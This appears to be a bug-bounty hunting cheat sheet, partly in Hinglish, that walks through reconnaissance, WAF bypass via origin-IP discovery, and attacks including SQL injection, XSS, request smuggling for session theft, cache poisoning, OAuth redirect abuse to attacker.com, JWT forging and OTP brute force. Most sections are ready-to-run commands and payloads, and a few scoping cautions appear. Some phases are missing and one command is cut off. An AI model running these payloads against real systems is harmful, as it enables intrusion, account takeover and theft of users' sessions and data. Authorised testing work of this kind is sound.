PHASE 01

Subdomain Enumeration & Asset Gathering

FOUNDATIONAL

Maximize subdomain coverage using automated engines, certificate transparency logs, GitHub scraping, permutations and brute-forcing.

01.Automated Enumeration
▼
# Subfinder — all sources + recursive
subfinder -d target.com -all -recursive -silent -o subfinder.txt

# Assetfinder
assetfinder --subs-only target.com | tee assetfinder.txt

# Findomain — API based fast discovery
findomain -t target.com -u findomain.txt

# Amass passive enum
amass enum -passive -d target.com | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt

# Chaos — ProjectDiscovery dataset
chaos -d target.com -silent | tee chaos.txt
02.Manual Discovery via Public Sources
▼
# Certificate Transparency (crt.sh)
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crt.txt

# AlienVault OTX passive DNS
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/target.com/passive_dns" | jq -r '.passive_dns[].hostname' | sort -u > otx.txt

# Wayback Machine historical hosts
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sort | sed -e 's_https*://__' -e 's/\/.*//' | sort -u > wayback.txt

# VirusTotal sibling domains
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=API_KEY&domain=target.com" | jq -r '.domain_siblings[]' > vt.txt

# HackerTarget passive DNS
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com" | cut -d',' -f1 > hackertarget.txt
03.GitHub & Shodan Scraping
▼
# GitHub subdomains scraper (needs GH token to avoid rate-limit)
github-subdomains -d target.com -t YOUR_GITHUB_TOKEN -o github_subs.txt

# Shosubgo — Shodan powered
shosubgo -d target.com -s YOUR_SHODAN_KEY
04.Merge, Dedupe & Permutations
▼
# Combine everything, sort unique
cat subfinder.txt assetfinder.txt crt.txt 2>/dev/null | sort -u > all_subdomains.txt

# Alterx permutations + dnsx live validation
cat all_subdomains.txt | alterx | dnsx -silent -o live_mutated_subs.txt

# Wordlist enrichment
echo target.com | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx -silent > mutated_resolved.txt
05.FFUF Subdomain Brute-force
▼
ffuf -u "https://FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc 200,301,302,403 -t 50 -o ffuf_subs.json
PHASE 02

Network Infra & ASN Mapping

FOUNDATIONAL

Expand attack surface beyond the domain: ASN ranges, CIDRs, sibling infrastructure owned by the org.

06.ASN → IP Discovery
▼
asnmap -d target.com | dnsx -silent -resp-only > asn_ips.txt
07.Amass Intel — Org / CIDR / ASN
▼
amass intel -org "Target Organization"
amass intel -active -cidr 192.168.1.0/24
amass intel -active -asn 13335
PHASE 03

Live Host Probing & Visual Triage

FOUNDATIONAL

Filter resolved subdomains down to what's actually alive, fingerprint tech stack, and visually triage for admin panels & staging boxes.

08.HTTPX Live Detection
▼
cat all_subdomains.txt | httpx -p 80,443,8080,8443,8000,8888 -sc -title -td -fr -o live_hosts.txt
cat live_hosts.txt | awk '{print $1}' > live_urls.txt
09.Aquatone Screenshots
▼
cat live_urls.txt | aquatone -out ~/aquatone/target_screenshots -threads 10
PHASE 04

Crawling, Archival & Parameter Mining

HIGH VALUE

Deep crawl every live app, pull archived URLs from Wayback/GAU, then bucket parameters by vuln class using gf.

10.Katana & Hakrawler Crawling
▼
katana -list live_urls.txt -d 3 -jc -kf all -silent -o katana_urls.txt
cat live_urls.txt | hakrawler -depth 2 -scope subs -plain > hakrawler_urls.txt
11.GAU & Wayback Historical URLs
▼
gau target.com --threads 20 | tee gau_urls.txt
echo target.com | waybackurls | tee wayback_urls.txt
cat katana_urls.txt hakrawler_urls.txt gau_urls.txt wayback_urls.txt | uro > all_clean_urls.txt
12.GF Pattern Extraction
▼
cat all_clean_urls.txt | gf xss      | uro | tee xss_urls.txt
cat all_clean_urls.txt | gf sqli     | uro | tee sqli_urls.txt
cat all_clean_urls.txt | gf ssrf     | uro | tee ssrf_urls.txt
cat all_clean_urls.txt | gf redirect | uro | tee redirect_urls.txt
cat all_clean_urls.txt | gf lfi      | uro | tee lfi_urls.txt
13.Hidden Parameter Discovery (Arjun)
▼
arjun -u "https://target.com/page.php" --get -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# passive mode with rate-limit
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"
PHASE 05

Content Discovery & Sensitive Leakage

HIGH VALUE

Hunt for exposed backups, config files, credentials and hidden directories that never made it into the sitemap.

14.Sensitive File Regex
▼
cat all_clean_urls.txt | grep -E "\.(json|env|log|zip|sql|conf|bak|yaml|yml|git|ini|pem|key|csv)$" | tee leaked_files.txt
15.Directory / File Brute-force
▼
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,403 -t 40

dirsearch -u https://target.com -e php,html,js,json,bak,txt -w /usr/share/seclists/Discovery/Web-Content/common.txt --deep-recursive
16.Git Repository Disclosure
▼
cat urls.txt | httpx -silent -path /.git/config -mc 200 -ms "[core]"
cat domains.txt | httpx -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
17.JavaScript Recon & Secret Extraction
▼
# harvest .js files & scan for exposures
echo target.com | katana -d 3 | grep -E "\.js$" | nuclei -t nuclei-templates/http/exposures/ -c 30

# LinkFinder — endpoint extraction
cat alljs.txt | xargs -I@ -P10 bash -c 'python3 linkfinder.py -i @ -o cli 2>/dev/null' | tee endpoints.txt

# SecretFinder — API keys / tokens
cat alljs.txt | xargs -I@ -P5 python3 SecretFinder.py -i @ -o cli | tee secrets.txt

# quick grep for hardcoded secrets
cat jsfiles.txt | grep -E "aws_access_key|api_key|secret|password|jwt|firebase|oauth_token"
PHASE 06

Automated Vulnerability Auditing

CRITICAL

Run template-driven scanning to catch known misconfigs and CVEs across the whole live host list — fast triage before manual testing.

18.Nuclei — Exposures & CVEs
▼
nuclei -l live_urls.txt -t http/misconfiguration/ -t http/exposures/ -bs 50 -c 30 -o nuclei_exposures.txt
nuclei -l live_urls.txt -t http/cves/ -severity critical,high -o nuclei_cves.txt
19.Port Scanning
▼
naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt
nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan
masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt
20.WordPress Recon (WPScan)
▼
wpscan --url https://site.com --disable-tls-checks --api-token TOKEN -e at -e ap -e u --plugins-detection aggressive --force
PHASE 07

Vulnerability Testing — SQLi / XSS / LFI

CRITICAL

Where recon meets exploitation. Take the gf-filtered URL sets and start probing for real, reportable bugs.

21.SQL Injection (BlindStrike & SQLMap)
▼
# BlindStrike — empirical latency baseline & boolean blind SQLi framework
blindstrike -l sqli_urls.txt -p payloads/generic.txt -t 10 --stop-on-confirm --html-report blindstrike_report.html

# Single URL or custom parameter FUZZ injection
blindstrike -u "https://target.com/api/v1/user?id=1FUZZ" -p payloads/mysql.txt -v

# SQLMap verification
cat urls.txt | gf sqli | uro | anew sqli.txt && sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2

# error-based quick check
cat urls.txt | gf sqli | qsreplace "'" | httpx -silent -ms "error|sql|syntax|mysql|postgresql" | tee sqli_errors.txt

# time-based blind check
cat urls.txt | gf sqli | qsreplace "1' AND SLEEP(5)-- -" | httpx -silent -timeout 10
22.Cross-Site Scripting — XSS (Reflectra & Dalfox)
▼
# Reflectra — context-aware probing + real headless Chrome dialog interception
reflectra -f xss_urls.txt -t 10 --stop-on-first-confirmed -o reflectra_report.html

# Single target scan
reflectra -u "https://target.com/search?q=test" --max-payloads-per-point 100

# Dalfox pipe triage
echo target.com | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox pipe --silence --skip-bav

echo target.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"># blind xss via out-of-band collaborator
subfinder -d example.com | gau | bxss -payload '"><script src=https://YOUR-COLLAB></script>' -header "X-Forwarded-For"
23.Local File Inclusion (LFI)
▼
nuclei -l subs.txt -t nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30

echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:[x*]:0:0:"

PHASE 10

IP-Centric Port Scanning & Deep Fuzzing Pipeline

HIGH VALUE

Core concept: subdomains ko IPs me convert karke duplicate scan load hatana, non-standard web ports probe karna, aur service-level fuzzing run karna.

32.Large-Scale Subdomain Aggregation (Chaos)
▼
# ProjectDiscovery ke dataset se targeted subdomains collect karein
chaos -d target.com -silent -o chaos_subs.txt
33.Live Probing, IP Extraction & Deduplication
▼
# Live hosts probe karein aur IPs resolve karein
cat chaos_subs.txt | httpx -silent -ip -o live_hosts_ip.txt

# Unique IP addresses extract aur sort karein — same CDN/backend IP par duplicate scan avoid karne ke liye
cat live_hosts_ip.txt | awk '{print $NF}' | tr -d '[]' | sort -u > unique_ips.txt
34.Fast Port Discovery via Naabu
▼
# Unique IPs par open + non-standard web ports discover karein (80,443,8080,8443,8000,8888,9000)
naabu -list unique_ips.txt -top-ports 1000 -silent -o open_ports.txt
35.Nmap Service & Version Enumeration
▼
nmap -sV -sC -iL open_ports.txt -Pn -T4 -oX nmap_results.xml
36.Nmap XML → HTML Triage Report
▼
# Raw XML ko visual triage dashboard me convert karein (unauth DBs, FTP, Tomcat, Jenkins jaldi spot karne ke liye)
python3 nmap_parser.py -f nmap_results.xml -o nmap_report.html
37.Port-Specific Nuclei Scan & FFUF Directory Fuzzing
▼
# Targeted CVE scan
nuclei -l open_ports.txt -tags cve -severity critical,high -o nuclei_cves.txt

# Non-standard port fuzzing — hidden files, backups (.bak, .conf, .env)
ffuf -u http://TARGET_IP:PORT/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,301,302,403 -fc 404 -t 40
Tip: Note 403 Forbidden endpoints for path normalization testing and custom header bypass evaluation.

PHASE 12

Origin IP Discovery — WAF / CDN Bypass

CRITICAL

Cloudflare aur similar WAFs 70%+ bug bounty targets protect karte hain. Origin server mil jaye toh koi firewall, koi rate-limit nahi rehta — direct raw access. (Ref: Jason Haddix's Bug Hunter's Methodology, Cyber-note 2026 recon methodology)

46.Favicon Hash Pivot (favUp / FavFreak)
▼
# Companies reuse the same favicon across all infra — hash is a fingerprint, searchable on Shodan
python3 favUp.py -ff favicon.ico --shodan-cli
python3 favUp.py --web target-behind-cloudflare.com -sc

# favirecon — lightweight single-target favicon recon
favirecon -u https://target.com/ -v

# FavFreak — sort your entire subdomain list by favicon hash (mismatched hash = worth investigating)
cat subs.txt | python3 favfreak.py -o output

# Manual: get favicon → hash it → shodan.io search "http.favicon.hash:-382492124"
47.Historical DNS & Analytics ID Pivot
▼
# Historical A-records from before the target sat behind a CDN
echo "target.com" | originiphunter
cat domains.txt | originiphunter

# Google Analytics / GTM ID often ties together an entire corporate family of domains
cat subdomains.txt | analyticsrelationships

# Manual OSINT: securitytrails.com, viewdns.info/iphistory, censys.io, builtwith.com/relationships/target.com
48.Direct-IP Verification
▼
# Confirm the candidate IP actually serves the target's content, bypassing the CDN edge
curl -s -H "Host: target.com" https://CANDIDATE_IP/ -k -I

# If it returns the same favicon/title and is NOT a known Cloudflare/Akamai/Fastly range → that's origin
nmap -p 80,443 -sV CANDIDATE_IP
Once origin IP verified, apply your existing content-discovery, nuclei & fuzzing phases (05, 10, 11) directly against it — no WAF in the way.
PHASE 13

Google & GitHub Dorking for Sensitive Data

HIGH VALUE

Purely passive — no packet touches the target. Hidden panels, misconfigured storage, aur leaked credentials Google/GitHub ke index se hi mil jaate hain. (Ref: Intigriti & YesWeHack recon series)

49.Core Google Dork Operators
▼
# Scoped to one domain
site:target.com inurl:admin
site:target.com "confidential" OR "internal use only"

# Open directories / exposed backups
site:target.com intitle:"index of" "backup"
site:target.com ext:sql OR ext:log OR ext:bak "password"

# Exposed login/admin panels
site:target.com inurl:/admin/login OR inurl:phpmyadmin

# Cached / removed pages
cache:target.com
50.Automated Dork Scanning
▼
# GitDorker — automates GitHub dorking across a curated dork list
python3 GitDorker.py -tf tokens.txt -d target.com -q dorks/alldorks.txt -o github_leaks.txt

# dorks-eye — quick Google dork automation
python3 dorks-eye.py -d "site:target.com" -p 5

# gitdork — generates google + shodan + github dorks from a domain/repo

PHASE 15

GraphQL, WebSocket & JWT Auditing

CRITICAL

Modern API surface — GraphQL introspection leaks the entire schema, WebSockets skip standard CSRF/CORS protections, and JWTs are routinely misconfigured.

56.GraphQL Endpoint Discovery & Introspection
▼
# Common endpoint brute-force
ffuf -u https://target.com/FUZZ -w graphql-endpoints.txt -mc 200,400

# Introspection query — dumps full schema if not disabled in prod
curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}' | jq

# GraphQLmap — interactive exploitation once schema is known
python3 graphqlmap.py -u https://target.com/graphql
57.GraphQL Depth / Batching Abuse (DoS & Rate-Limit Bypass)
▼
# InQL — Burp extension for automated query mutation & vuln discovery, run headless via CLI
inql -t https://target.com/graphql -o inql_output/

# Batching bypass — stack multiple mutations in a single request to dodge per-request rate limits
curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(user:\"a\",pass:\"1\")}"},{"query":"mutation{login(user:\"a\",pass:\"2\")}"}]'
58.WebSocket Endpoint Discovery & Manipulation
▼
# Grep crawled JS/HTML for ws:// or wss:// endpoints
cat all_clean_urls.txt katana_urls.txt | grep -oE "wss?://[a-zA-Z0-9./_-]+" | sort -u

# Manual handshake — check Origin header validation (cross-site WS hijacking)
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Origin: https://evil.com" \
  -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" -H "Sec-WebSocket-Version: 13" https://target.com/ws
59.JWT Token Auditing
▼
# jwt_tool — alg confusion, none-alg, signature stripping, key confusion in one pass
python3 jwt_tool.py YOUR_JWT_TOKEN -M at

# Test alg:none bypass explicitly
python3 jwt_tool.py YOUR_JWT_TOKEN -X a

# Brute-force weak HMAC secret
jwt-cracker YOUR_JWT_TOKEN abcdefghijklmnopqrstuvwxyz 6
PHASE 16

Business Logic, Race Conditions & IDOR

CRITICAL

Scanners in yeh sab miss karte hain — yahan sabse zyada high-severity, low-competition bounties milte hain. Manual thinking required. (Ref: PortSwigger race-condition research, Jason Haddix Application Analysis edition)

60.Race Condition — Single-Packet Attack
▼
# Turbo Intruder (Burp extension) — send 20-30 requests in the same TCP packet to defeat request-level locks
# Load turbo-intruder's race-single-packet-attack.py against the checkout/redeem/vote endpoint

# CLI approximation with parallel curl (less reliable than single-packet, useful for quick triage)
for i in {1..20}; do curl -s -X POST https://target.com/api/redeem-coupon -d "code=SAVE50" & done; wait
61.Mass Assignment & HTTP Parameter Pollution
▼
# Arjun in JSON body mode — spot hidden writable fields
arjun -u https://target.com/api/profile --json -m POST -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# x8 — hidden parameter discovery, fast Rust implementation
x8 -u https://target.com/api/profile -w params.txt -X POST

# Manual mass-assignment probe — smuggle a privilege field into a normal update request
curl -s -X PUT https://target.com/api/profile -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","isVerified":true}'
62.Systematic IDOR Sweep
▼
# Diff two authenticated sessions (userA vs userB) against every object-ID endpoint found in recon
cat all_clean_urls.txt | grep -E "(id=|/[0-9]{2,}(/|$))" | tee idor_candidates.txt

# Autorize (Burp extension) automates this: replay every request with a low-priv session's cookie
# and flags identical 200 responses as likely IDOR — run manually per-endpoint if unavailable
Numeric & UUID both matter — sequential IDs are the obvious case, but UUIDs leaked via other endpoints (JS files, API responses) are just as exploitable.

PHASE 22

HTTP Request Smuggling & Desync Attacks

CRITICAL

James Kettle (PortSwigger) ke research par based — CL.TE, TE.CL, TE.TE, H2.CL, H2.TE, aur CL.0 variants. Front-end/back-end disagreement karna hamare core exploit primitive hai. Account takeover, firewall bypass, XSS delivery — sab yahan se chain hote hain. Targets: CDN+LB setups, HAProxy, nginx-behind-apache stacks.

97.Detect Smuggling Variant (HTTP/1.1)
▼
# Step 1 — Fingerprint proxy stack (Via / X-Forwarded-For headers)
curl -sv https://target.com/ 2>&1 | grep -i "via\|x-forwarded\|server\|x-cache"

# Step 2 — Burp Extension: HTTP Request Smuggler (auto-detects CL.TE/TE.CL/TE.TE/H2.*)
# Extensions → BApp Store → "HTTP Request Smuggler" by James Kettle
# Right-click request → Extensions → Launch Smuggler

# Step 3 — Manual CL.TE timing probe (timeout = differential detected)
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q

# Step 4 — Manual TE.CL probe
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

6
PREFIX
0
98.CL.TE / TE.CL Exploitation Chain
▼
# CL.TE — Smuggle a prefix that poisons next user's request
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Foo: x

# TE.CL — Smuggle a request that hijacks next user's body
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

96
POST /capture HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

username=
0

# H2.CL / H2.TE — HTTP/2 to HTTP/1.1 downgrade (Burp HTTP/2 tab required)
# Add injected header: transfer-encoding: chunked (lowercase, via Burp Inspector)
# Then send CL.TE payload body — CDN/LB strips h2 framing, backend sees smuggled request
DO NOT send live exploits — always use the dontpoisoneveryone param technique: add a unique cache-buster (random param) to limit impact to your own session during testing. Use Burp Repeater, always uncheck "Update Content-Length".
99.CL.0 & TE.0 — Modern Browser-Friendly Variants (2025)
▼
# CL.0 — Front-end passes CL, back-end ignores it entirely (treats GET as 0-body)
# Great against non-standard backends (Express, Flask, custom proxies)
POST /resources/images/target.jpg HTTP/1.1
Host: target.com
Content-Length: 34
Connection: keep-alive

GET /admin HTTP/1.1
Foo: x

# TE.0 — Front-end sees chunked; back-end ignores TE header
# Detect: send chunked with deliberately truncated body — back-end should respond immediately

# Smuggling to bypass front-end auth on /admin:
POST / HTTP/1.1
Host: target.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
Content-Length: 10

x=1
100.Smuggling → Account Takeover (ATO) Chain
▼
# 1 — Confirm smuggling is CL.TE
# 2 — Find a post-auth endpoint that reflects a value (search, profile edit)
# 3 — Smuggle a prefix that appends the next user's session token to your capture endpoint

POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /searchResults?q=xyz HTTP/1.1
Host: target.com
Cookie: session=attacker_session
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=

# When victim sends their next request, their Cookie header appends to your search param
# Check GET /searchResults — victim's session cookie will appear in reflected output
# Reference: Evan Custodio's $30k Slack ATO via request smuggling
PHASE 23

Cache Poisoning, Cache Deception & Prototype Pollution

CRITICAL

Advanced web vulnerability research based on James Kettle (PortSwigger) and DEF CON research. Cache poisoning forces reverse-proxies to cache malicious responses. Cache deception tricks CDNs into caching authenticated private data. Prototype pollution manipulates JavaScript prototype objects to achieve authentication bypass or remote code execution. Chaining these vectors produces critical P1 exploit paths.

101.Web Cache Poisoning — Discovery (Param Miner)
▼
# Step 1 — Install Param Miner (Burp BApp Store, James Kettle)
# Extensions → Param Miner → "Guess headers" on any cacheable page

# Step 2 — Find unkeyed headers (vary: header tells you what IS keyed)
# Common unkeyed: X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL
curl -H "X-Forwarded-Host: evil.com" https://target.com/ -sv 2>&1 | grep -i "evil.com\|cache\|age"

# Step 3 — Cache buster: add random param to scope to your own test
curl "https://target.com/page?cb=UNIQUE123" -H "X-Forwarded-Host: evil.com"

# Step 4 — Remove buster, confirm poisoned response serves to next request
curl "https://target.com/page"   # look for your evil.com in response
102.Cache Poisoning — Exploit via XSS / Open Redirect Gadget
▼
# Pattern 1 — X-Forwarded-Host reflected in JS import → stored XSS for all visitors
GET /static/main.js?cb=unique123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"></script><script>alert(document.cookie)</script>

# Pattern 2 — X-Forwarded-Host redirects login form action
# Host reflection in: Location headers, link href, meta refresh, og:url

# Pattern 3 — Unkeyed query parameter (Fat GET)
GET /home HTTP/1.1
Host: target.com

109.OAuth Attack Surface Mapping

# Step 1 — Identify OAuth grant type

# Implicit flow: /authorize?response_type=token&... (token in URL fragment — worst case)

client_id, redirect_uri, state, scope, response_type, nonce (OIDC)

site:target.com "redirect_uri"

110.Redirect URI Bypass & Auth Code Theft
▼
# Bypass 1 — Subdomain confusion (if regex only checks suffix)
redirect_uri=https://evil.target.com/callback
redirect_uri=https://target.com.evil.com/callback

# Bypass 2 — Path traversal in redirect_uri
redirect_uri=https://target.com/callback/../../../evil.com

# Bypass 3 — URL fragment theft via open redirect
# If app has: GET /redirect?url=... → combine with implicit flow
redirect_uri=https://target.com/redirect?url=https://attacker.com
# Browser sends: https://attacker.com#access_token=...  (fragment leaks)

# Bypass 4 — Referrer leak (token in URL, page loads external resource)
# Implicit flow puts token in URL → any external resource load leaks via Referer

# Bypass 5 — IPv6 multi-@: Mohamed Benchikh technique (PortSwigger Top 10 2025)
redirect_uri=https://target.com@evil.com/callback  (parser strips @target.com if IPv6 quirk present)

PHASE 27

Report Writing, POC Template & Triage Checklist

HIGH VALUE

Best technical finding bhi poorly written report mein reject ya downgrade ho jaata hai. Program triage ke liye exactly yahi chahiye: reproducibility, impact statement, CVSS estimate, clear steps. Reference: HackerOne disclosed reports + Bugcrowd disclosure guidelines.

117.Pre-Report Checklist (7-Question Gate)
▼
BEFORE writing any report, confirm:

1. Is the asset in-scope per the program's current scope table?
2. Can I reproduce it 100% from my notes right now?
3. Is there a real impact? (ATO, data leak, RCE, payment bypass — NOT just "misconfiguration")
4. Is it already disclosed in the program's known-issues list?
5. Did I check recent HackerOne Hacktivity for a duplicate?
   https://hackerone.com/hacktivity?order_direction=DESC&only_hackerone_acknowledged=true
6. Have I validated it is NOT a scanner false positive? (Manual verify required)
7. Is my CVSS score honest? (Overrating = trust loss; underrating = money loss)
118.Report Template (Accepted by HackerOne / Bugcrowd)
▼
## Vulnerability: [Type] in [Component/Endpoint]

**Severity:** Critical / High / Medium / Low / Informational
**CVSS v3.1 Score:** [e.g. 9.8 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]
**CWE:** [e.g. CWE-89 SQL Injection]

---

### Summary
[2–3 sentences: what the bug is, where it exists, why it matters]

Example:
An unauthenticated SQL injection vulnerability exists in the /api/users?filter=
parameter. An attacker can extract the full users table including hashed passwords
and session tokens, leading to full account takeover for all users.

---

### Impact
[Be specific about what real-world damage this enables]
- Full database read access including [columns: email, password_hash, session_token]
- Potential for account takeover of all [N] users
- [Compliance impact if applicable: GDPR, PCI-DSS]

---

### Steps to Reproduce

1. Log in as any authenticated user (credentials: test@test.com / password123)
2. Navigate to: https://target.com/api/users
3. Append SQLi payload to filter parameter:
   ?filter=1' OR '1'='1
4. Observe full user table returned in JSON response.
5. [Screenshot / response attached]

---

### Proof of Concept
[Curl command, Burp request, or minimal script]
curl -s "https://target.com/api/users?filter=1%27+OR+%271%27%3D%271" \
  -H "Authorization: Bearer [TOKEN]"

---

### Suggested Remediation
- Use parameterized queries / prepared statements
- Apply input validation (whitelist of allowed filter values)
- Rotate any potentially exposed session tokens immediately
119.Severity Calibration — CVSS Shortcuts
▼
CRITICAL (9.0+):
  Unauthenticated RCE, unauthenticated SQLi dumping PII, auth bypass → admin, ATO at scale

HIGH (7.0–8.9):
  Authenticated RCE, SQLi (requires auth), SSRF → internal, stored XSS → ATO, IDOR (sensitive data)

MEDIUM (4.0–6.9):
  Reflected XSS, blind SSRF (no internal access), CSRF on sensitive action, open redirect, info leak

LOW (0.1–3.9):
  Self-XSS, clickjacking (no sensitive action), rate limit on non-sensitive endpoint, verbose error

INFO / N/A:
  Best practices violation with no practical exploit path, SPF record missing (most programs)

API Security Deep-Dive — REST, GraphQL, Mass Assignment, BOLA

CRITICAL

APIs are the highest-paying attack surface in 2025. BOLA (Broken Object Level Authorization) is OWASP API #1 three years running. Mass assignment, hidden parameters, API versioning issues, unauthenticated endpoints — all systematically covered here. Reference: APIsecurity.io, Inon Shkedy's API hacking methodology.

127.API Discovery & Endpoint Enumeration
▼
# Step 1 — Find all API endpoints from JS files
katana -u https://target.com -jc -d 5 -silent | grep -oP '"(/api/[^"]+)"' | sort -u
subjs -i live_hosts.txt | xargs -I{} curl -s {} | grep -oP '"/api/[^"]+"' | sort -u

# Step 2 — Scan for common API paths
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,401,403 -t 50

# Step 3 — Find older/hidden API versions (v0, v1, v2, beta, internal)
ffuf -u https://api.target.com/FUZZ/users -w wordlists/api_versions.txt -mc 200,401,403
# wordlist: v1 v2 v3 v4 v0 beta alpha internal legacy old dev staging

# Step 4 — Swagger/OpenAPI spec discovery
printf "swagger.json\nopenapi.json\nswagger.yaml\napi-docs\napi/swagger.json\nv1/swagger.json\nv2/api-docs\n" | ffuf -u https://target.com/FUZZ -w - -mc 200

# Step 5 — Parse Swagger spec → extract all endpoints automatically
python3 -c "
import json,sys
spec=json.load(open('swagger.json'))
for path,methods in spec.get('paths',{}).items():
    for method in methods:
        print(method.upper(), path)
"
128.BOLA / IDOR at Scale — Mass Authorization Testing
▼
# BOLA = Broken Object Level Authorization = access ANY user's data by changing ID
# Setup: 2 accounts — attacker (A) and victim (B)

# Step 1 — Map all object IDs in attacker's session
# Login as A, use app normally, capture all requests in Burp → filter by ID params

# Step 2 — Automated BOLA with Autorize (Burp Extension)
# Configure victim (B) cookie in Autorize → replay ALL attacker requests with victim's token
# Any 200 response that matches = BOLA confirmed

# Step 3 — Manual IDOR patterns to test
GET  /api/v1/users/{id}/profile        → change id to victim's
GET  /api/v1/orders/{order_id}         → try sequential IDs
GET  /api/v1/documents/{uuid}          → try other UUIDs from same org
PUT  /api/v1/users/{id}/email          → change another user's email
DELETE /api/v1/files/{file_id}         → delete victim's files

# Step 4 — Non-obvious IDOR: object IDs in headers, cookies, POST body
X-User-Id: 1234             → change to 1235
account_id=abc123           → swap with another
{"userId": "self"}          → try "admin", specific ID, UUID

# Step 5 — BOLA via HTTP method change (BFLA)
GET  /api/admin/users → 403
POST /api/admin/users → might be 200 (method confusion)
129.Mass Assignment & Hidden Parameter Discovery
▼
# Mass assignment: server accepts extra fields user shouldn't control
# e.g. POST /api/user/update with {"name":"attacker","isAdmin":true}

# Step 1 — Find hidden parameters with Arjun
arjun -u https://target.com/api/v1/user/update -m POST --include '{"name":"test"}'
arjun -u https://target.com/api/v1/user         -m GET

# Step 2 — Find with x8 (faster, HTTP/2 support)
x8 -u "https://target.com/api/v1/user/update" -X POST -w params_wordlist.txt

# Step 3 — Common mass assignment params to try manually
isAdmin / is_admin / admin / role / user_role / group / privilege
verified / is_verified / email_verified / phone_verified
balance / credits / plan / subscription / tier
password / password_hash / api_key / token

# Step 4 — JSON body mass assignment test
# Original request:
POST /api/profile {"display_name": "attacker"}
# Test with injected fields:
POST /api/profile {"display_name": "attacker", "role": "admin", "is_admin": true, "plan": "enterprise"}
130.API Rate Limit Bypass & Authentication Attacks
▼
# Rate limit bypass techniques (OTP brute force, login brute force)

# Technique 1 — IP rotation via headers
X-Forwarded-For: 1.2.3.{1..255}
X-Real-IP: 10.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 192.168.1.1
True-Client-IP: 10.0.0.1

# Technique 2 — Null byte / case variation in email (same inbox)
# Gmail ignores dots: attacker@gmail.com = a.t.t.a.c.k.e.r@gmail.com
attacker@gmail.com
attacker+1@gmail.com
attacker+2@gmail.com

# Technique 3 — Turbo Intruder single-packet OTP brute force
# All 10,000 OTP requests in ONE TCP packet → server processes before expiry
# In Burp: right-click request → Extensions → Turbo Intruder → race-single-packet-attack.py

# Technique 4 — API key leakage in response headers
curl -sv https://target.com/api/v1/health 2>&1 | grep -i "x-api\|authorization\|api-key\|token"

# Technique 5 — JWT none algorithm / weak secret
python3 -c "
import base64,json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).decode().rstrip('=')
print(header+'.'+payload+'.')
"
# Or use jwt_tool:
python3 jwt_tool.py TOKEN -X a     # alg:none attack
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt  # crack weak secret
